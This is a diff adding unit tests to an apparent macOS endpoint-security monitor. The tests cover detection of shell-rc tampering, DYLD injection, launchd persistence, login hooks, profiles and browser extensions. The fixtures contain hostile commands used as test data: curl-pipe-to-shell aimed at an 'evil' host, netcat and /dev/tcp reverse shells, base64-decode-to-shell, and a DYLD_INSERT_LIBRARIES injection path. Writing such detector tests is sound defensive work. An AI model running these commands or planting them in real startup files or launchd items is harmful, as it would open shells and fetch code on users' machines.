@@ -44,8 +44,18 @@ class Sandbox(unittest.TestCase):
             "SIGCACHE": os.path.join(self.state, "sigcache.json"),
             "ALLOWLIST": os.path.join(self.state, "allowlist.json"),
             "RUN_LOG": os.path.join(self.state, "run.log"),
+            "SELFSTATE": os.path.join(self.state, "selfstate.json"),
+            "SELF_PLIST": os.path.join(self.state, "com.charlie.aegis.plist"),
             "PERSISTENCE_DIRS": [self.pers],
             "HOT_DIRS": [self.hot],
+            # New baseline-diffed surfaces read real machine state (shell rc,
+            # profiles, browser extensions) — pin them empty so tests are
+            # deterministic and never depend on the dev host. Individual tests
+            # override a single surface to exercise it.
+            "SHELL_RC_FILES": [],
+            "EXTRA_PERSIST_FILES": [],
+            "EXTRA_PERSIST_DIRS": [],
+            "BROWSER_EXT_ROOTS": [],
             "_sigcache": {},
         }
         for k, v in overrides.items():
@@ -340,6 +350,233 @@ class TestNeverRepeat(Sandbox):
         aegis.cmd_scan(quiet=True)
         self.assertEqual(len(self.notifications), n)
         subprocess.run(["rm", "-f", "/tmp/aegis_rt_nr"], check=False)
+
+
+# =========================================================================== #
+# NEW DETECTION SURFACES (residual-gap coverage vs 2025-26 stealer TTPs).
+# Each class pins one new detector; all are fully sandboxed and machine-agnostic.
+# =========================================================================== #
+
+
+# --------------------------------------------------------------------------- #
+# N1 — shell startup files (T1546.004): a payload dropped in ~/.zshrc must be
+# caught, and scored HIGH when it carries a download-and-run idiom.
+# --------------------------------------------------------------------------- #
+class TestShellRc(Sandbox):
+    def _rc(self, name, body):
+        p = os.path.join(self.tmp, name)
+        with open(p, "w") as f:
+            f.write(body)
+        return p
+
+    def test_new_hostile_rc_is_high(self):
+        p = self._rc(".zshrc", "export PATH=$PATH\ncurl -fsSL http://evil/x | sh\n")
+        aegis.SHELL_RC_FILES = [p]
+        f = aegis.diff_shellrc({}, aegis.snapshot_shellrc())
+        self.assertEqual(len(f), 1)
+        self.assertEqual(f[0]["severity"], "HIGH")
+        self.assertIn("pipe-to-shell", f[0]["hostile"])
+
+    def test_new_benign_rc_is_medium_not_high(self):
+        p = self._rc(".zshrc", "alias ll='ls -la'\nexport EDITOR=vim\n")
+        aegis.SHELL_RC_FILES = [p]
+        f = aegis.diff_shellrc({}, aegis.snapshot_shellrc())
+        self.assertEqual(f[0]["severity"], "MEDIUM", "benign rc must not be HIGH")
+
+    def test_changed_rc_alerts(self):
+        p = self._rc(".zshrc", "alias ll='ls -la'\n")
+        aegis.SHELL_RC_FILES = [p]
+        prior = aegis.snapshot_shellrc()
+        with open(p, "a") as fh:
+            fh.write("nc -e /bin/sh 10.0.0.1 4444\n")
+        f = aegis.diff_shellrc(prior, aegis.snapshot_shellrc())
+        self.assertEqual(len(f), 1)
+        self.assertEqual(f[0]["title"], "Shell startup file CHANGED")
+        self.assertEqual(f[0]["severity"], "HIGH")
+
+    def test_first_sight_is_adopted_silently_then_change_alerts(self):
+        # End-to-end: an existing rc at first scan must NOT alert (trust what's
+        # installed); a mutation AFTER baseline must.
+        p = self._rc(".zshrc", "alias ll='ls -la'\n")
+        aegis.SHELL_RC_FILES = [p]
+        aegis.check_hardening = lambda: []
+        aegis.check_processes = lambda: []
+        aegis.cmd_scan(quiet=True)                      # first run: adopt
+        self.assertEqual(self.notifications, [])
+        with open(p, "a") as fh:
+            fh.write("curl http://evil | sh\n")         # attacker appends
+        aegis.cmd_scan(quiet=True)
+        self.assertTrue(self.notifications, "post-baseline rc change must alert")
+
+
+# --------------------------------------------------------------------------- #
+# N2 — DYLD code-injection env in a launchd plist scores >= HIGH even when the
+# program itself is Apple-signed (AMOS/Poseidon dylib-injection persistence).
+# --------------------------------------------------------------------------- #
+class TestDyldInjection(Sandbox):
+    def test_dyld_insert_libraries_is_high(self):
+        rec = {"label": "x", "program": "/usr/bin/python3", "args": None,
+               "trust": "apple", "sha256": "s", "run_at_load": True,
+               "env": {"DYLD_INSERT_LIBRARIES": "/Users/me/.hidden/evil.dylib"}}
+        fs = aegis.check_persistence({}, {"/fake/x.plist": rec})
+        self.assertGreaterEqual(aegis.SEV_ORDER[fs[0]["severity"]],
+                                aegis.SEV_ORDER["HIGH"])
+
+    def test_snapshot_captures_only_injection_env(self):
+        import plistlib as _p
+        path = os.path.join(self.pers, "com.x.plist")
+        with open(path, "wb") as f:
+            _p.dump({"Label": "x", "Program": "/usr/bin/true",
+                     "EnvironmentVariables": {"DYLD_INSERT_LIBRARIES": "/tmp/e.dylib",
+                                              "LANG": "en_US.UTF-8"}}, f)
+        snap = aegis.snapshot_persistence()
+        env = snap[path]["env"]
+        self.assertEqual(env, {"DYLD_INSERT_LIBRARIES": "/tmp/e.dylib"},
+                         "only injection-relevant env kept (no PII/noise)")
+
+
+# --------------------------------------------------------------------------- #
+# N3 — expanded hostile-arg idioms in launchd persistence (base64|sh, /dev/tcp).
+# --------------------------------------------------------------------------- #
+class TestExpandedHostileArgs(Sandbox):
+    def _sev(self, args):
+        rec = {"label": "x", "program": args[0], "args": args, "trust": "apple",
+               "sha256": "s", "run_at_load": True, "env": None}
+        return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]
+
+    def test_base64_decode_pipe_shell_is_high(self):
+        sev = self._sev(["/bin/sh", "-lc", "echo aGkK | base64 -d | sh"])
+        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"])
+
+    def test_dev_tcp_reverse_shell_is_high(self):
+        # No inline flag, no interpreter, no fetch keyword: caught purely by the
+        # /dev/tcp reverse-shell idiom embedded in the arguments.
+        sev = self._sev(["/opt/tool", "run", "exec 5<>/dev/tcp/10.0.0.1/4444"])
+        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"])
+
+    def test_benign_args_stay_low(self):
+        self.assertEqual(self._sev(["/bin/echo", "hello world"]), "LOW")
+
+
+# --------------------------------------------------------------------------- #
+# N4 — quarantine provenance: a side-loaded (no-quarantine) hot-dir binary is
+# annotated as Gatekeeper-bypassing; the download agent is parsed when present.
+# --------------------------------------------------------------------------- #
+class TestQuarantineProvenance(Sandbox):
+    def test_origin_absent_and_present(self):
+        p = os.path.join(self.tmp, "f")
+        with open(p, "w") as f:
+            f.write("x")
+        self.assertEqual(aegis.quarantine_origin(p), (False, None))
+        subprocess.run(["xattr", "-w", "com.apple.quarantine",
+                        "0081;00000000;Safari;ABC", p], check=False)
+        present, agent = aegis.quarantine_origin(p)
+        self.assertTrue(present)
+        self.assertEqual(agent, "Safari")
+
+    def test_hotdir_side_loaded_note(self):
+        payload = self.adhoc_binary(os.path.join(self.hot, "payload"))
+        # clang output has no quarantine xattr → side-loaded
+        f = [x for x in aegis.check_hot_dirs() if x["path"] == payload]
+        self.assertTrue(f)
+        self.assertFalse(f[0]["quarantined"])
+        self.assertIn("side-loaded", f[0]["detail"])
+
+
+# --------------------------------------------------------------------------- #
+# N5 — self-protection: tamper on the monitor's own state is a HIGH signal, with
+# no false positive on a machine that never installed the launchd agent.
+# --------------------------------------------------------------------------- #
+class TestSelfProtection(Sandbox):
+    def test_log_truncation_detected(self):
+        with open(aegis.FINDINGS_LOG, "w") as f:
+            f.write("a" * 10)
+        aegis.save_json(aegis.SELFSTATE, {"findings_size": 9999})
+        fps = [x["fingerprint"] for x in aegis.check_self_protection()]
+        self.assertTrue(any(fp.startswith("self:log:truncated") for fp in fps))
+
+    def test_agent_removed_only_after_learned(self):
+        # never installed → silent
+        self.assertEqual(aegis.check_self_protection(), [])
+        # learned installed, plist now gone → HIGH
+        aegis.save_json(aegis.SELFSTATE, {"installed": True})
+        fps = [x["fingerprint"] for x in aegis.check_self_protection()]
+        self.assertIn("self:agent:removed", fps)
+
+    def test_no_false_positive_on_growing_log(self):
+        with open(aegis.FINDINGS_LOG, "w") as f:
+            f.write("a" * 100)
+        aegis.save_json(aegis.SELFSTATE, {"findings_size": 50})  # grew, fine
+        fps = [x["fingerprint"] for x in aegis.check_self_protection()]
+        self.assertFalse(any("truncated" in fp for fp in fps))
+
+
+# --------------------------------------------------------------------------- #
+# N6 — config profiles & login hooks: a newly-installed profile or hook alerts.
+# --------------------------------------------------------------------------- #
+class TestProfilesAndHooks(Sandbox):
+    def test_new_profile_is_high(self):
+        f = aegis.diff_profiles({}, {"com.evil.mdm": True})
+        self.assertEqual(len(f), 1)
+        self.assertEqual(f[0]["severity"], "HIGH")
+        self.assertEqual(f[0]["category"], "config-profile")
+
+    def test_preexisting_profile_not_realerted(self):
+        prior = {"com.corp.wifi": True}
+        self.assertEqual(aegis.diff_profiles(prior, {"com.corp.wifi": True}), [])
+
+    def test_new_loginhook_is_high(self):
+        f = aegis.diff_loginhooks({}, {"LoginHook": "/tmp/evil.sh"})
+        self.assertEqual(f[0]["severity"], "HIGH")
+        self.assertEqual(f[0]["category"], "persistence")
+
+
+# --------------------------------------------------------------------------- #
+# N7 — browser extension inventory diff: a newly-appearing extension alerts.
+# --------------------------------------------------------------------------- #
+class TestBrowserExtensions(Sandbox):
+    def _chromium(self, extid, name):
+        root = os.path.join(self.tmp, "Chrome")
+        vdir = os.path.join(root, "Default", "Extensions", extid, "1.0")
+        os.makedirs(vdir)
+        with open(os.path.join(vdir, "manifest.json"), "w") as f:
+            json.dump({"name": name}, f)
+        return root
+
+    def test_new_extension_detected_with_name(self):
+        root = self._chromium("abcdefghijklmnop", "Evil Wallet Drainer")
+        aegis.BROWSER_EXT_ROOTS = [(root, "chromium")]
+        snap = aegis.snapshot_browserext()
+        self.assertTrue(any("abcdefghijklmnop" in k for k in snap))
+        f = aegis.diff_browserext({}, snap)
+        self.assertEqual(len(f), 1)
+        self.assertEqual(f[0]["severity"], "MEDIUM")
+        self.assertIn("Evil Wallet Drainer", f[0]["detail"])
+
+
+# --------------------------------------------------------------------------- #
+# N8 — upgrade safety: an EXISTING install (baseline has only "persistence")
+# gaining newly-watched surfaces must adopt them SILENTLY, not alert-storm.
+# --------------------------------------------------------------------------- #
+class TestSurfaceAdoptionOnUpgrade(Sandbox):
+    def test_existing_install_adopts_new_surface_silently(self):
+        rc = os.path.join(self.tmp, ".zshrc")
+        with open(rc, "w") as f:
+            f.write("curl http://evil | sh\n")   # even a hostile-looking rc…
+        aegis.SHELL_RC_FILES = [rc]
+        aegis.check_hardening = lambda: []
+        aegis.check_processes = lambda: []
+        # simulate a pre-upgrade baseline: persistence key only, no "shellrc".
+        aegis.save_json(aegis.BASELINE,
+                        {"created": "2026-01-01T00:00:00+00:00", "persistence": {}})
+        aegis.cmd_scan(quiet=True)
+        # …is adopted as known-good on first sight (no alert storm on upgrade)…
+        self.assertEqual(self.notifications, [],
+                         "first sighting of a surface is adopted silently")
+        # …and the baseline now carries the surface for future diffing.
+        with open(aegis.BASELINE) as fh:
+            base = json.load(fh)
+        self.assertIn("shellrc", base)
 
 
 if __name__ == "__main__":
